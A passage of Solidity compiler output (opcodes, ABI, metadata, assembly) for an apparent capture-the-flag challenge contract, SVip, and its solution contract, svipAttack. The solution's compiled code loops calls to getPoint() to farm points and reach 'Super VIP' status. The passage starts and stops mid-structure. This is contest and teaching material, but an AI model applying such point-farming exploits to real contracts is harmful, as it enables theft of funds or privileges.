											"end": 813,
											"name": "POP"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "POP"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "POP"
										},
										{
											"begin": 485,
											"end": 813,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "JUMPDEST"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "MSTORE"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "MSTORE"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "KECCAK256"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP2"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "POP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SWAP1"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "POP"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "SLOAD"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "DUP2"
										},
										{
											"begin": 49,
											"end": 87,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "JUMPDEST"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "MSTORE"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "MSTORE"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "KECCAK256"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP2"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "POP"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SLOAD"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "EXP"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "SWAP1"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DIV"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "AND"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "DUP2"
										},
										{
											"begin": 94,
											"end": 136,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "JUMPDEST"
										},
										{
											"begin": 405,
											"end": 408,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 393,
											"end": 402,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 393,
											"end": 402,
											"name": "SLOAD"
										},
										{
											"begin": 393,
											"end": 408,
											"name": "LT"
										},
										{
											"begin": 385,
											"end": 409,
											"name": "ISZERO"
										},
										{
											"begin": 385,
											"end": 409,
											"name": "ISZERO"
										},
										{
											"begin": 385,
											"end": 409,
											"name": "PUSH [tag]",
											"value": "34"
										},
										{
											"begin": 385,
											"end": 409,
											"name": "JUMPI"
										},
										{
											"begin": 385,
											"end": 409,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 385,
											"end": 409,
											"name": "DUP1"
										},
										{
											"begin": 385,
											"end": 409,
											"name": "REVERT"
										},
										{
											"begin": 385,
											"end": 409,
											"name": "tag",
											"value": "34"
										},
										{
											"begin": 385,
											"end": 409,
											"name": "JUMPDEST"
										},
										{
											"begin": 442,
											"end": 443,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 420,
											"end": 426,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "DUP1"
										},
										{
											"begin": 427,
											"end": 437,
											"name": "CALLER"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "AND"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "AND"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "DUP2"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "MSTORE"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "ADD"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "SWAP1"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "DUP2"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "MSTORE"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "ADD"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "KECCAK256"
										},
										{
											"begin": 420,
											"end": 438,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "DUP3"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "DUP3"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SLOAD"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "ADD"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SWAP3"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "POP"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "POP"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "DUP2"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SWAP1"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "SSTORE"
										},
										{
											"begin": 420,
											"end": 443,
											"name": "POP"
										},
										{
											"begin": 454,
											"end": 463,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 454,
											"end": 463,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "DUP2"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "SLOAD"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "DUP1"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "SWAP3"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "SWAP2"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "SWAP1"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "ADD"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "SWAP2"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "SWAP1"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "POP"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "SSTORE"
										},
										{
											"begin": 454,
											"end": 465,
											"name": "POP"
										},
										{
											"begin": 348,
											"end": 473,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "JUMPDEST"
										},
										{
											"begin": 864,
											"end": 868,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 889,
											"end": 899,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 900,
											"end": 910,
											"name": "CALLER"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "AND"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "AND"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "DUP2"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "MSTORE"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "ADD"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "SWAP1"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "DUP2"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "MSTORE"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "ADD"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "KECCAK256"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "SWAP1"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "SLOAD"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "SWAP1"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "EXP"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "SWAP1"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "DIV"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 889,
											"end": 911,
											"name": "AND"
										},
										{
											"begin": 881,
											"end": 912,
											"name": "ISZERO"
										},
										{
											"begin": 881,
											"end": 912,
											"name": "ISZERO"
										},
										{
											"begin": 881,
											"end": 912,
											"name": "PUSH [tag]",
											"value": "36"
										},
										{
											"begin": 881,
											"end": 912,
											"name": "JUMPI"
										},
										{
											"begin": 881,
											"end": 912,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 881,
											"end": 912,
											"name": "DUP1"
										},
										{
											"begin": 881,
											"end": 912,
											"name": "REVERT"
										},
										{
											"begin": 881,
											"end": 912,
											"name": "tag",
											"value": "36"
										},
										{
											"begin": 881,
											"end": 912,
											"name": "JUMPDEST"
										},
										{
											"begin": 930,
											"end": 934,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 923,
											"end": 934,
											"name": "SWAP1"
										},
										{
											"begin": 923,
											"end": 934,
											"name": "POP"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "SWAP1"
										},
										{
											"begin": 821,
											"end": 942,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "JUMPDEST"
										},
										{
											"begin": 249,
											"end": 252,
											"name": "PUSH",
											"value": "3E7"
										},
										{
											"begin": 227,
											"end": 233,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "DUP1"
										},
										{
											"begin": 234,
											"end": 244,
											"name": "CALLER"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "AND"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "AND"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "DUP2"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "MSTORE"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "ADD"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "SWAP1"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "DUP2"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "MSTORE"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "ADD"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "KECCAK256"
										},
										{
											"begin": 227,
											"end": 245,
											"name": "SLOAD"
										},
										{
											"begin": 227,
											"end": 252,
											"name": "LT"
										},
										{
											"begin": 227,
											"end": 252,
											"name": "ISZERO"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "ISZERO"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "ISZERO"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH [tag]",
											"value": "38"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "JUMPI"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "MLOAD"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP2"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "MSTORE"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "ADD"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP1"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP1"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "ADD"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP3"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP2"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "SUB"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP3"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "MSTORE"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "23"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP2"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "MSTORE"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "ADD"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP1"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "536F7272792C20796F7520646F6E2774206861766520656E6F75676820706F69"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP2"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "MSTORE"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "ADD"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "6E74730000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP2"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "MSTORE"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "POP"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "ADD"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "SWAP2"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "POP"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "POP"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "MLOAD"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "DUP1"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "SWAP2"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "SUB"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "SWAP1"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "REVERT"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "tag",
											"value": "38"
										},
										{
											"begin": 219,
											"end": 292,
											"name": "JUMPDEST"
										},
										{
											"begin": 328,
											"end": 332,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 303,
											"end": 313,
											"name": "DUP1"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 314,
											"end": 324,
											"name": "CALLER"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "AND"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "AND"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "DUP2"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "MSTORE"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "ADD"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "SWAP1"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "DUP2"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "MSTORE"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "ADD"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "KECCAK256"
										},
										{
											"begin": 303,
											"end": 325,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "EXP"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "DUP2"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "SLOAD"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "DUP2"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "MUL"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "NOT"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "AND"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "SWAP1"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "DUP4"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "ISZERO"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "ISZERO"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "MUL"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "OR"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "SWAP1"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "SSTORE"
										},
										{
											"begin": 303,
											"end": 332,
											"name": "POP"
										},
										{
											"begin": 176,
											"end": 340,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "JUMPDEST"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "SLOAD"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "DUP2"
										},
										{
											"begin": 143,
											"end": 167,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"getPoint()": "5bea9faa",
							"isComplete()": "b2fa1c9e",
							"isSuperVip(address)": "4095da72",
							"numOfFree()": "fab1512e",
							"points(address)": "358b8166",
							"promotionSVip()": "db78cdad",
							"transferPoints(address,uint256)": "326f823f"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.4.26+commit.4563c3fc\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferPoints\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"points\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSuperVip\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getPoint\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isComplete\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"promotionSVip\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"numOfFree\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u4e8c\\u9898/SVip.sol\":\"SVip\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u4e8c\\u9898/SVip.sol\":{\"keccak256\":\"0x4139b96a54747737279279df36d81f25a6f233aa841e18148e5d1d4b8f4da435\",\"urls\":[\"bzzr://8f5088e054d58465f2f4a6ddefd1e1f924ddcfd3e59ef113412f0b6c2ff88e08\"]}},\"version\":1}",
					"userdoc": {
						"methods": {}
					}
				}
			},
			"赛题-预赛/第二题/SvipAttack.sol": {
				"svipAttack": {
					"abi": [
						{
							"constant": false,
							"inputs": [],
							"name": "get",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "transfer",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"name": "_addr",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"赛题-预赛/第二题/SvipAttack.sol\":48:437  contract svipAttack{\r... */\n  mstore(0x40, 0x80)\n    /* \"赛题-预赛/第二题/SvipAttack.sol\":88:149  constructor(address _addr){\r... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x0\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"赛题-预赛/第二题/SvipAttack.sol\":88:149  constructor(address _addr){\r... */\n  pop\n  mload(0x40)\n  0x20\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  dup1\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"赛题-预赛/第二题/SvipAttack.sol\":135:140  _addr */\n  dup1\n    /* \"赛题-预赛/第二题/SvipAttack.sol\":125:127  sv */\n  0x0\n  dup1\n    /* \"赛题-预赛/第二题/SvipAttack.sol\":125:141  sv = SVip(_addr) */\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"赛题-预赛/第二题/SvipAttack.sol\":88:149  constructor(address _addr){\r... */\n  pop\n    /* \"赛题-预赛/第二题/SvipAttack.sol\":48:437  contract svipAttack{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":48:437  contract svipAttack{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x6d4ce63c\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x8a4068dd\n      eq\n      tag_3\n      jumpi\n    tag_1:\n      0x0\n      dup1\n      revert\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":155:256  function get()public{\r... */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_4\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_4:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":155:256  function get()public{\r... */\n      pop\n      tag_5\n      jump(tag_6)\n    tag_5:\n      stop\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":262:434  function transfer()public{\r... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_7\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_7:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":262:434  function transfer()public{\r... */\n      pop\n      tag_8\n      jump(tag_9)\n    tag_8:\n      stop\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":155:256  function get()public{\r... */\n    tag_6:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":190:196  uint i */\n      0x0\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":198:199  0 */\n      dup1\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":190:199  uint i =0 */\n      swap1\n      pop\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":186:249  for(uint i =0;i<99;i++){\r... */\n    tag_11:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":202:204  99 */\n      0x63\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":200:201  i */\n      dup2\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":200:204  i<99 */\n      lt\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":186:249  for(uint i =0;i<99;i++){\r... */\n      iszero\n      tag_12\n      jumpi\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":224:226  sv */\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":224:235  sv.getPoint */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x5bea9faa\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":224:237  sv.getPoint() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_14\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_14:\n        /* \"赛题-预赛/第二题/SvipAttack.sol\":224:237  sv.getPoint() */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_15\n      